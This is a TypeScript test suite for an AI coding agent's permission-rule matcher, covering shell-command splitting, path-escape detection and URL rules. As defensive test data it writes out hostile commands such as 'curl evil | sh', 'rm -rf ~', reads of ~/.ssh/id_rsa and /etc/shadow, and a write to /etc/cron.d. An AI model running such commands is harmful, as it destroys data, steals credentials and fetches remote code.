import { homedir } from 'node:os'
import { describe, it, expect } from 'vitest'
import {
  alreadyAllowedAsRule,
  cleanupPermissionRules,
  matchRule,
  networkDestination,
  parseTightenOnlyRules,
  permissionSubject,
  shellReferencesExternalPath,
  shellRulePatterns,
  splitShellCommand
} from './permissions'
import type { PermissionRule } from '@shared/types'

const allow = (tool: string, match: string): PermissionRule => ({ action: 'allow', tool, match })
const deny = (tool: string, match: string): PermissionRule => ({ action: 'deny', tool, match })

describe('permissionSubject', () => {
  it('picks the right field per tool', () => {
    expect(permissionSubject('run_shell', { command: 'git status' })).toBe('git status')
    expect(permissionSubject('web_fetch', { url: 'https://x.com' })).toBe('https://x.com')
    expect(permissionSubject('web_search', { query: 'rust' })).toBe('rust')
    expect(permissionSubject('read_file', { path: 'src/a.ts' })).toBe('src/a.ts')
    expect(permissionSubject('glob', { pattern: '**/*.ts' })).toBe('**/*.ts')
    expect(permissionSubject('read_file', {})).toBe('')
  })
})

describe('networkDestination', () => {
  it('keys web_fetch / view_localhost on the URL host (lowercased)', () => {
    expect(networkDestination('web_fetch', { url: 'https://API.GitHub.com/repos' })).toBe('api.github.com')
    expect(networkDestination('web_fetch', { url: 'http://example.com:8080/x' })).toBe('example.com')
    expect(networkDestination('view_localhost', { url: 'http://localhost:3000/' })).toBe('localhost')
  })

  it('collapses every gh_* call onto github.com (one grant covers them all)', () => {
    expect(networkDestination('gh_pr_create', { title: 'x' })).toBe('github.com')
    expect(networkDestination('gh_run_view', { run_id: 1 })).toBe('github.com')
  })

  it('gives web_search a single stable key (the query has no host)', () => {
    expect(networkDestination('web_search', { query: 'rust async' })).toBe('web_search')
  })

  it('falls back to the tool name for a malformed or missing URL (never a blanket pass)', () => {
    expect(networkDestination('web_fetch', { url: 'not a url' })).toBe('web_fetch')
    expect(networkDestination('web_fetch', {})).toBe('web_fetch')
    expect(networkDestination('some_future_net_tool', {})).toBe('some_future_net_tool')
  })
})

describe('shellReferencesExternalPath', () => {
  // A concrete workspace root the commands live in, so absolute paths INTO it are
  // recognised as in-workspace rather than escapes.
  const ROOTS = ['/work/project']
  const ext = (cmd: string): boolean => shellReferencesExternalPath(cmd, ROOTS)

  it('flags absolute and home-relative paths outside the roots', () => {
    expect(ext('cat /etc/passwd')).toBe(true)
    expect(ext('ls /')).toBe(true)
    expect(ext('cat ~/.ssh/id_rsa')).toBe(true)
    expect(ext('ls ~')).toBe(true)
  })

  it('does NOT flag an absolute path that resolves inside a workspace root', () => {
    // The `cd /abs/workspace && …` false positive that forced needless full-auto prompts.
    expect(ext('cd /work/project && npm install')).toBe(false)
    expect(ext('cd /work/project/server && npx tsc')).toBe(false)
    expect(ext('sleep 5 && cd /work/project && ls -la')).toBe(false)
    // A nested absolute path and the bare root itself are both inside.
    expect(ext('cat /work/project/src/index.ts')).toBe(false)
    expect(ext('ls /work/project')).toBe(false)
  })

  it('flags an absolute path that resolves outside every root', () => {
    expect(ext('cat /work/other/secret')).toBe(true)
    // A sibling that merely shares a name prefix is NOT inside (no false negative).
    expect(ext('cat /work/project-secrets/creds')).toBe(true)
    // An absolute path whose `..` climbs back out of the root escapes.
    expect(ext('cat /work/project/../secret')).toBe(true)
  })

  it('honours additional roots', () => {
    const roots = ['/work/a', '/work/b']
    expect(shellReferencesExternalPath('cd /work/b/pkg && npm i', roots)).toBe(false)
    expect(shellReferencesExternalPath('cat /work/a/src/x.ts', roots)).toBe(false)
    expect(shellReferencesExternalPath('cat /work/c/x', roots)).toBe(true)
  })

  it('flags relative paths that climb above the workspace', () => {
    expect(ext('cat ../outside.txt')).toBe(true)
    expect(ext('cat a/../../b')).toBe(true)
    expect(ext('cat ..')).toBe(true)
  })

  it('does not flag in-workspace paths or non-path tokens', () => {
    expect(ext('cat src/index.ts')).toBe(false)
    expect(ext('cat ./README.md')).toBe(false)
    // Climbs then returns — stays within the workspace.
    expect(ext('cat a/../b')).toBe(false)
    expect(ext('git status')).toBe(false)
    expect(ext('npm run build')).toBe(false)
    // A URL contains "//" but is not an absolute filesystem path.
    expect(ext('curl https://example.com')).toBe(false)
  })

  it('looks past an = for env prefixes and flag values', () => {
    expect(ext('FOO=/etc/secret cat $FOO')).toBe(true)
    expect(ext('grep x --file=/etc/hosts')).toBe(true)
    expect(ext('FOO=bar cat src/a.ts')).toBe(false)
    // An `=` value pointing into the workspace is not an escape.
    expect(ext('--project=/work/project/tsconfig.json tsc')).toBe(false)
  })

  it('honours quotes when tokenizing', () => {
    expect(ext('cat "/etc/passwd"')).toBe(true)
    expect(ext("cat '../escape'")).toBe(true)
    expect(ext('echo "hello world"')).toBe(false)
  })

  it('flags the unexpanded $HOME / ${HOME} env var', () => {
    expect(ext('cat $HOME/.ssh/id_rsa')).toBe(true)
    expect(ext('cat ${HOME}/.netrc')).toBe(true)
    expect(ext('grep x --file=$HOME/.aws/credentials')).toBe(true)
    // Boundary-anchored: a different var that merely starts with HOME is not flagged.
    expect(ext('echo $HOMEWORK')).toBe(false)
  })

  it('flags Windows drive-absolute and UNC paths', () => {
    expect(ext('type C:\\Users\\me\\secret.txt')).toBe(true)
    expect(ext('type C:/Windows/System32/config')).toBe(true)
    expect(ext('dir \\\\server\\share')).toBe(true)
  })

  it('flags backslash relative climbs', () => {
    expect(ext('type ..\\..\\outside')).toBe(true)
    // A backslash path that stays inside does not escape.
    expect(ext('type sub\\file.txt')).toBe(false)
  })

  it('flags a redirection glued to an external target', () => {
    // The operator stays inside the token (no space), so the path must be peeled.
    expect(ext('cat <~/.ssh/id_rsa')).toBe(true)
    expect(ext('echo pwn >/etc/cron.d/evil')).toBe(true)
    expect(ext('cat </etc/passwd')).toBe(true)
    expect(ext('cat >>~/.bashrc')).toBe(true)
    // A leading fd on the operator (`2>`, `1>>`) is still peeled.
    expect(ext('run 2>/var/log/x')).toBe(true)
    expect(ext('run 1>>$HOME/out')).toBe(true)
    // A redirection into / relative to the workspace is not an escape.
    expect(ext('echo ok >/work/project/out.txt')).toBe(false)
    expect(ext('echo ok >out.txt')).toBe(false)
  })

  it('flags a quoted external path glued to a flag/env prefix', () => {
    // The tokenizer only strips quotes wrapping a whole token, so a quote glued after
    // `=` survives and must be peeled before the path is recognised.
    expect(ext('grep secret --file="/etc/shadow"')).toBe(true)
    expect(ext("grep secret --file='/etc/hosts'")).toBe(true)
    expect(ext('SECRET="/etc/passwd" cat x')).toBe(true)
    expect(ext('cat >"/etc/x"')).toBe(true)
    // A quoted `=` value pointing into the workspace is not an escape.
    expect(ext('--project="/work/project/tsconfig.json" tsc')).toBe(false)
  })
})

describe('matchRule', () => {
  const rules: PermissionRule[] = [
    { action: 'deny', tool: 'run_shell', match: '*rm -rf*' },
    { action: 'allow', tool: 'run_shell', match: 'git *' },
    { action: 'ask', tool: 'write_file', match: 'src/secret/**' },
    { action: 'allow', tool: '*', match: 'docs/**' }
  ]

  it('returns null when no rules', () => {
    expect(matchRule(undefined, 'run_shell', 'ls')).toBeNull()
    expect(matchRule([], 'run_shell', 'ls')).toBeNull()
  })

  it('first matching rule wins (deny before allow)', () => {
    expect(matchRule(rules, 'run_shell', 'git status')).toBe('allow')
    expect(matchRule(rules, 'run_shell', 'sudo rm -rf /')).toBe('deny')
  })

  it('matches a glob over the subject', () => {
    expect(matchRule(rules, 'write_file', 'src/secret/keys.ts')).toBe('ask')
    expect(matchRule(rules, 'write_file', 'src/app.ts')).toBeNull()
  })

  it('honours the wildcard tool', () => {
    expect(matchRule(rules, 'read_file', 'docs/readme.md')).toBe('allow')
    expect(matchRule(rules, 'edit_file', 'docs/x/y.md')).toBe('allow')
  })

  it('does not match a different tool', () => {
    expect(matchRule(rules, 'web_fetch', 'git status')).toBeNull()
  })

  describe('glob `*` spans `/` for URLs and nested paths', () => {
    it('a URL glob matches across path segments', () => {
      const r: PermissionRule[] = [
        { action: 'allow', tool: 'web_fetch', match: 'https://docs.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://docs.example.com/3/library/os.html')).toBe('allow')
      expect(matchRule(r, 'web_fetch', 'https://other.example.com/x')).toBeNull()
    })

    it('a deny URL glob fires on nested paths (no silent under-match)', () => {
      const r: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://evil.example.com/track/pixel?x=1')).toBe('deny')
    })

    it('a bare host/dir prefix covers its sub-paths', () => {
      const url: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com' }
      ]
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com')).toBe('deny')
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com/a/b')).toBe('deny')

      const dir: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src' }]
      expect(matchRule(dir, 'read_file', 'src/a/b/c.ts')).toBe('allow')
    })

    it('a path glob spans nested directories', () => {
      const r: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src/*' }]
      expect(matchRule(r, 'read_file', 'src/a/b/c.ts')).toBe('allow')
      expect(matchRule(r, 'read_file', 'lib/a.ts')).toBeNull()
    })
  })

  describe('path subjects are canonicalized and anchored to the roots', () => {
    const ROOTS = ['/work/project']

    it('a deny cannot be dodged by respelling the same path', () => {
      const r: PermissionRule[] = [deny('read_file', '/etc/*')]
      expect(matchRule(r, 'read_file', '/etc/passwd', ROOTS)).toBe('deny')
      // Same file, different spelling — the rule must still fire.
      expect(matchRule(r, 'read_file', '/tmp/../etc/passwd', ROOTS)).toBe('deny')
      expect(matchRule(r, 'read_file', '/etc/./passwd', ROOTS)).toBe('deny')
    })

    it('a relative allow rule does NOT auto-approve a climb out of the workspace', () => {
      // The core hole: `src/*` is a `^src/.*$` regex, so the raw subject
      // `src/../../../etc/passwd` matched it and auto-approved reading /etc/passwd.
      const r: PermissionRule[] = [allow('read_file', 'src/*')]
      expect(matchRule(r, 'read_file', 'src/../../../etc/passwd', ROOTS)).toBeNull()
      expect(matchRule(r, 'read_file', 'src/a/../../../../etc/passwd', ROOTS)).toBeNull()
      // ...but a climb that returns into src/ is genuinely in src/.
      expect(matchRule(r, 'read_file', 'src/a/../b.ts', ROOTS)).toBe('allow')
    })

    it('anchors a relative rule to the roots, so an absolute in-workspace path matches it', () => {
      const r: PermissionRule[] = [allow('read_file', 'src/*')]
      expect(matchRule(r, 'read_file', '/work/project/src/a.ts', ROOTS)).toBe('allow')
      expect(matchRule(r, 'read_file', '/work/other/src/a.ts', ROOTS)).toBeNull()
    })

    it('anchors an absolute rule, so an equivalent relative path matches it', () => {
      const r: PermissionRule[] = [{ action: 'ask', tool: 'write_file', match: '/work/project/prod/*' }]
      expect(matchRule(r, 'write_file', 'prod/deploy.ts', ROOTS)).toBe('ask')
    })

    it('matches a `~` rule against the expanded home path', () => {
      const r: PermissionRule[] = [deny('read_file', '~/.ssh/*')]
      expect(matchRule(r, 'read_file', `${homedir()}/.ssh/id_rsa`, ROOTS)).toBe('deny')
      // The literal, unexpanded spelling stays covered too.
      expect(matchRule(r, 'read_file', '~/.ssh/id_rsa', ROOTS)).toBe('deny')
    })

    it('honours a secondary root', () => {
      const r: PermissionRule[] = [allow('read_file', 'notes/*')]
      expect(matchRule(r, 'read_file', '/work/vault/notes/a.md', ['/work/project', '/work/vault'])).toBe('allow')
    })

    it('leaves a search query alone (not a path)', () => {
      const r: PermissionRule[] = [allow('web_search', 'rust/../async')]
      expect(matchRule(r, 'web_search', 'rust/../async', ROOTS)).toBe('allow')
    })
  })

  describe('URL rules are case-insensitive on scheme and host', () => {
    it('a deny cannot be dodged by upper-casing the host or scheme', () => {
      const r: PermissionRule[] = [deny('web_fetch', 'https://evil.example.com/*')]
      expect(matchRule(r, 'web_fetch', 'https://EVIL.example.com/steal')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'HTTPS://Evil.Example.COM/steal')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'https://evil.example.com:8443/steal')).toBeNull() // port is part of the host:port authority
    })

    it('matches an upper-cased rule against a lower-cased call', () => {
      const r: PermissionRule[] = [allow('web_fetch', 'https://API.GitHub.com/*')]
      expect(matchRule(r, 'web_fetch', 'https://api.github.com/repos')).toBe('allow')
    })

    it('keeps the path case-sensitive (it is, per RFC 3986)', () => {
      const r: PermissionRule[] = [deny('web_fetch', 'https://x.com/Secret/*')]
      expect(matchRule(r, 'web_fetch', 'https://x.com/Secret/a')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'https://x.com/secret/a')).toBeNull()
    })

    it('does not case-fold a non-URL-shaped pattern', () => {
      // `*Evil*` has no scheme, so it must keep matching case-sensitively.
      const r: PermissionRule[] = [deny('web_fetch', '*/Evil/*')]
      expect(matchRule(r, 'web_fetch', 'https://x.com/Evil/a')).toBe('deny')
      expect(matchRule(r, 'web_fetch', 'https://x.com/evil/a')).toBeNull()
    })
  })

  describe('run_shell quoting cannot dodge a rule', () => {
    const denyRm: PermissionRule[] = [deny('run_shell', '*rm -rf*')]

    it('sees through quotes around the program and its flags', () => {
      expect(matchRule(denyRm, 'run_shell', '"rm" -rf /tmp/x')).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', "'rm' -rf /tmp/x")).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', "r''m -rf /tmp/x")).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', 'rm -r"f" /tmp/x')).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', 'r"m" "-rf" /tmp/x')).toBe('deny')
    })

    it('sees through backslash escapes', () => {
      expect(matchRule(denyRm, 'run_shell', '\\rm -rf /tmp/x')).toBe('deny')
      expect(matchRule(denyRm, 'run_shell', 'r\\m -r\\f /tmp/x')).toBe('deny')
    })

    it('still matches a rule the user wrote WITH quotes', () => {
      const r: PermissionRule[] = [allow('run_shell', 'git commit -m "*"')]
      expect(matchRule(r, 'run_shell', 'git commit -m "a message"')).toBe('allow')
      expect(matchRule(r, 'run_shell', 'git commit -m unquoted')).toBe('allow')
    })

    it('does not let quote-stripping smuggle a command past an allow rule', () => {
      const allowEcho: PermissionRule[] = [allow('run_shell', 'echo *')]
      expect(matchRule(allowEcho, 'run_shell', 'echo "hi" && rm -rf /tmp/x')).toBeNull()
      expect(matchRule(denyRm, 'run_shell', 'echo "hi" && "rm" -rf /tmp/x')).toBe('deny')
    })
  })

  it('prefix-matches a bare command pattern', () => {
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: 'npm test' }], 'run_shell', 'npm test -- --watch')).toBe('allow')
  })

  it('* matches anything for the tool, but an empty pattern is inert (matches nothing)', () => {
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '*' }], 'write_file', 'anything.ts')).toBe('ask')
    // A blank match must NOT silently apply to every call — the rule falls through
    // (null) so the approval policy decides, rather than auto-allowing/denying all.
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '' }], 'write_file', 'anything.ts')).toBeNull()
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: '' }], 'run_shell', 'rm -rf /')).toBeNull()
  })

  describe('run_shell chained-command safety', () => {
    const allowGitStatus: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git status*' }]

    it('does NOT auto-approve an unapproved command chained onto an allowed one', () => {
      // The core bug: `git status*` must not allow-list a smuggled second command.
      expect(matchRule(allowGitStatus, 'run_shell', 'git status && curl evil | sh')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status; rm -rf ~')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status | tee /tmp/x')).toBeNull()
    })

    it('still allows a chain when every sub-command is allowed', () => {
      const allowGit: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git *' }]
      expect(matchRule(allowGit, 'run_shell', 'git status && git push')).toBe('allow')
    })

    it('treats an in-workspace `cd` prelude as non-gating so a generalized rule covers the chain', () => {
      const allowNpm: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'npm install' }]
      const roots = ['/repo']
      // The `cd /repo` (unmatched, in-workspace) must not block the allow of the real command.
      expect(matchRule(allowNpm, 'run_shell', 'cd /repo && npm install lodash', roots)).toBe('allow')
      // A command that is ONLY a directory change still falls through to the policy.
      expect(matchRule(allowNpm, 'run_shell', 'cd /repo', roots)).toBeNull()
      // A non-cd unmatched sub-command still blocks (no smuggling past the prelude).
      expect(matchRule(allowNpm, 'run_shell', 'cd /repo && npm install && curl evil | sh', roots)).toBeNull()
    })

    it('a workspace-ESCAPING `cd` stays gated (does not slip past on an allowed command)', () => {
      const allowCat: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'cat config' }]
      // `cd ~/.ssh` escapes /repo, so the chain is not auto-approved despite `cat config` being allowed.
      expect(matchRule(allowCat, 'run_shell', 'cd ~/.ssh && cat config', ['/repo'])).toBeNull()
    })

    it('still denies a `cd` chain when a sub-command is denied', () => {
      expect(matchRule(rules, 'run_shell', 'cd /repo && rm -rf ~', ['/repo'])).toBe('deny')
    })

    it('denies when any sub-command matches a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'git status && rm -rf ~')).toBe('deny')
    })

    it('inspects command-substitution bodies, not just the outer command', () => {
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf /)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo `rm -rf /tmp/x`')).toBe('deny')
    })

    it('does not let a paren inside a $(...) body hide a command from a narrow allow rule', () => {
      // A literal `(` in the substitution body used to defeat the extraction regex,
      // leaving `echo $(rm -rf ... "()")` matching `echo *` and auto-approving `rm`.
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf ~/x "()")')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo $(rm -rf /tmp/x "()")')).toBe('deny')
    })

    it('inspects process-substitution bodies (<(...) and >(...))', () => {
      const allowDiff: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'diff *' }]
      expect(matchRule(allowDiff, 'run_shell', 'diff <(ls) <(rm -rf x)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'diff <(ls) <(rm -rf /tmp/x)')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'tee >(rm -rf /tmp/x)')).toBe('deny')
    })

    it('inspects nested substitution bodies', () => {
      expect(matchRule(rules, 'run_shell', 'echo $(echo $(rm -rf /tmp/x))')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'cat <(diff <(rm -rf /tmp/x) <(ls))')).toBe('deny')
    })

    it('normalizes whitespace so spacing tricks cannot dodge a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'rm    -rf   /tmp/x')).toBe('deny')
    })
  })
})

describe('splitShellCommand', () => {
  it('splits on the shell control operators', () => {
    expect(splitShellCommand('a && b || c ; d | e & f')).toEqual(['a', 'b', 'c', 'd', 'e', 'f'])
  })

  it('extracts command-substitution and backtick bodies as their own segments', () => {
    expect(splitShellCommand('echo $(whoami)')).toContain('whoami')
    expect(splitShellCommand('echo `id`')).toContain('id')
  })

  it('extracts a substitution body even when it contains balanced parens', () => {
    expect(splitShellCommand('echo $(rm -rf ~/x "()")')).toContain('rm -rf ~/x "()"')
  })

  it('extracts process-substitution bodies', () => {
    const segs = splitShellCommand('diff <(ls) <(rm -rf x)')
    expect(segs).toContain('ls')
    expect(segs).toContain('rm -rf x')
  })

  it('expands nested substitution bodies', () => {
    expect(splitShellCommand('echo $(echo $(id))')).toContain('id')
    expect(splitShellCommand('cat <(diff <(whoami) <(ls))')).toContain('whoami')
  })

  it('returns the whole command for a simple command', () => {
    expect(splitShellCommand('npm test -- --watch')).toEqual(['npm test -- --watch'])
  })
})

describe('shellRulePatterns', () => {
  it('drops the `cd` prelude and generalizes to a <program> <verb> prefix', () => {
    expect(shellRulePatterns('cd /Users/me/repo && npm install lodash')).toEqual(['npm install'])
    expect(shellRulePatterns('cd /work/project && git status')).toEqual(['git status'])
  })

  it('collapses differing trailing args onto the same prefix', () => {
    // The point: two near-identical commands produce ONE identical rule.
    expect(shellRulePatterns('npm install foo bar')).toEqual(['npm install'])
    expect(shellRulePatterns('git commit -m "a long unique message"')).toEqual(['git commit'])
    expect(shellRulePatterns('npm install foo')[0]).toBe(shellRulePatterns('npm install baz')[0])
  })

  it('keeps raw file operations exact rather than broadening to the bare program', () => {
    // `rm`/`cat` must NOT generalize to `rm`/`cat` (which would allow any target).
    expect(shellRulePatterns('rm -rf build')).toEqual(['rm -rf build'])
    expect(shellRulePatterns('cat src/index.ts')).toEqual(['cat src/index.ts'])
  })

  it('keeps env-prefixed commands exact (the prefix is part of what runs)', () => {
    expect(shellRulePatterns('FOO=1 npm run build')).toEqual(['FOO=1 npm run build'])
  })

  it('keeps command-wrapper-prefixed commands exact (never broadens to `sudo rm`)', () => {
    // A wrapper's second token is a program, not a sub-command verb — generalizing
    // `sudo rm -rf /tmp/build` to `sudo rm` would then auto-approve `sudo rm -rf /`.
    expect(shellRulePatterns('sudo rm -rf /tmp/build')).toEqual(['sudo rm -rf /tmp/build'])
    expect(shellRulePatterns('sudo apt install foo')).toEqual(['sudo apt install foo'])
    expect(shellRulePatterns('xargs rm')).toEqual(['xargs rm'])
    expect(shellRulePatterns('nohup npm run dev')).toEqual(['nohup npm run dev'])
    // A non-wrapper program still generalizes to <program> <verb> (no regression).
    expect(shellRulePatterns('git status -s')).toEqual(['git status'])
  })

  it('emits one prefix per non-cd sub-command of a compound command', () => {
    expect(shellRulePatterns('cd /r && npm ci && npm run build')).toEqual(['npm ci', 'npm run'])
  })

  it('dedupes identical prefixes within one command', () => {
    expect(shellRulePatterns('git add . && git add -A')).toEqual(['git add'])
  })

  it('never returns an empty list', () => {
    expect(shellRulePatterns('cd /somewhere')).toEqual(['cd /somewhere'])
    expect(shellRulePatterns('')).toEqual([''])
  })

  it('produces a prefix the matcher actually allows for the original command', () => {
    const rules = shellRulePatterns('cd /r && npm install foo').map((m) => allow('run_shell', m))
    expect(matchRule(rules, 'run_shell', 'cd /r && npm install foo', ['/r'])).toBe('allow')
    // ...and for a sibling command with different args.
    expect(matchRule(rules, 'run_shell', 'npm install something-else')).toBe('allow')
  })
})

describe('alreadyAllowedAsRule', () => {
  it('is true when a broader shell rule already covers the sample', () => {
    expect(alreadyAllowedAsRule([allow('run_shell', 'git *')], 'run_shell', 'git status')).toBe(true)
    expect(alreadyAllowedAsRule([allow('run_shell', 'npm install')], 'run_shell', 'npm install')).toBe(true)
  })

  it('is false when nothing allows it (or a deny matches first)', () => {
    expect(alreadyAllowedAsRule([allow('run_shell', 'git *')], 'run_shell', 'npm ci')).toBe(false)
    expect(alreadyAllowedAsRule([deny('run_shell', 'git *')], 'run_shell', 'git status')).toBe(false)
    expect(alreadyAllowedAsRule([], 'run_shell', 'ls')).toBe(false)
  })

  it('handles non-shell tools via the subject matcher', () => {
    expect(alreadyAllowedAsRule([allow('web_fetch', 'https://x.com')], 'web_fetch', 'https://x.com/a')).toBe(true)
    expect(alreadyAllowedAsRule([allow('read_file', 'src')], 'read_file', 'src/a.ts')).toBe(true)
  })
})

describe('cleanupPermissionRules', () => {
  it('collapses a pile of exact cd-prefixed commands into a handful of prefixes', () => {
    const messy: PermissionRule[] = [
      allow('run_shell', 'cd /Users/me/repo && npm install foo'),
      allow('run_shell', 'cd /Users/me/repo && npm install bar baz'),
      allow('run_shell', 'cd /Users/me/repo && git status'),
      allow('run_shell', 'cd /Users/me/repo && git status -s')
    ]
    expect(cleanupPermissionRules(messy)).toEqual([
      allow('run_shell', 'npm install'),
      allow('run_shell', 'git status')
    ])
  })

  it('preserves non-shell, deny, and ask rules verbatim (only exact dedupe)', () => {
    const rules: PermissionRule[] = [
      deny('run_shell', 'rm -rf /'),
      { action: 'ask', tool: 'write_file', match: '**' },
      allow('web_fetch', 'https://api.example.com'),
      allow('web_fetch', 'https://api.example.com')
    ]
    expect(cleanupPermissionRules(rules)).toEqual([
      deny('run_shell', 'rm -rf /'),
      { action: 'ask', tool: 'write_file', match: '**' },
      allow('web_fetch', 'https://api.example.com')
    ])
  })

  it('does NOT generalize an allow when doing so would shadow a narrower deny', () => {
    const rules: PermissionRule[] = [
      deny('run_shell', 'git push --force'),
      allow('run_shell', 'cd /r && git push origin main')
    ]
    // The allow stays exact so `git push` never auto-approves the force-push.
    expect(cleanupPermissionRules(rules)).toEqual([
      deny('run_shell', 'git push --force'),
      allow('run_shell', 'cd /r && git push origin main')
    ])
    expect(matchRule(cleanupPermissionRules(rules), 'run_shell', 'git push --force')).toBe('deny')
  })

  it('does NOT generalize an allow when a WILDCARD deny would be shadowed', () => {
    // The one-directional literal shadow check missed this: generalizing
    // `git push --force origin main` to `git push` overlaps `* --force*` only on the
    // extended `git push --force …`, so the allow must be kept exact.
    const rules: PermissionRule[] = [
      allow('run_shell', 'git push --force origin main'),
      deny('run_shell', '* --force*')
    ]
    const cleaned = cleanupPermissionRules(rules)
    expect(cleaned).toEqual([
      allow('run_shell', 'git push --force origin main'),
      deny('run_shell', '* --force*')
    ])
    // A DIFFERENT force-push (not covered by the exact allow) is still denied — proof the
    // generalization did not open a hole. A benign `git status` was never allowed here.
    expect(matchRule(cleaned, 'run_shell', 'git push --force some-other-remote')).toBe('deny')
    expect(matchRule(cleaned, 'run_shell', 'git commit --force')).toBe('deny')
  })

  it('drops an allow already covered by an earlier broader allow', () => {
    const rules: PermissionRule[] = [allow('run_shell', 'git *'), allow('run_shell', 'git status')]
    expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'git *')])
  })

  it('is a no-op (idempotent) on already-clean generalized rules', () => {
    const clean: PermissionRule[] = [allow('run_shell', 'npm install'), allow('run_shell', 'git status')]
    expect(cleanupPermissionRules(clean)).toEqual(clean)
    expect(cleanupPermissionRules(cleanupPermissionRules(clean))).toEqual(clean)
  })
})

describe('parseTightenOnlyRules', () => {
  it('keeps deny/ask and drops allow / malformed / non-array', () => {
    expect(
      parseTightenOnlyRules(
        {
          permissionRules: [
            { action: 'deny', tool: 'run_shell', match: 'rm *' },
            { action: 'ask', tool: 'write_file', match: 'prod/**' },
            { action: 'allow', tool: '*', match: '*' }, // dropped — would loosen
            { action: 'deny' }, // dropped — missing tool/match
            { action: 'ask', tool: 1, match: 'x' }, // dropped — non-string tool
            42 // dropped — not an object
          ]
        },
        100
      )
    ).toEqual([
      { action: 'deny', tool: 'run_shell', match: 'rm *' },
      { action: 'ask', tool: 'write_file', match: 'prod/**' }
    ])
    expect(parseTightenOnlyRules({ permissionRules: 'nope' }, 100)).toEqual([])
    expect(parseTightenOnlyRules(null, 100)).toEqual([])
  })

  it('caps the number of rules at maxRules (DoS backstop)', () => {
    const many = Array.from({ length: 10 }, (_, i) => ({
      action: 'deny' as const,
      tool: 'run_shell',
      match: `cmd${i}`
    }))
    expect(parseTightenOnlyRules({ permissionRules: many }, 3)).toHaveLength(3)
  })
})
